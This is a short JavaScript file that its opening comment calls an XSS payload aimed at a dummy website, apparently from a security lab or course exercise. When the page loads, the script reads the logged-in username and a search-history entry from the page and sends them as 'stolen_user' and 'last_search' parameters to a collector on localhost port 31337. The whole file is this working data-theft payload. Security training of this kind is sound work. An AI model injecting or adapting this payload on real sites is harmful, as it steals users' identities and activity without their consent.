// A payload that targets a dummy website for XSS attacks

$(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });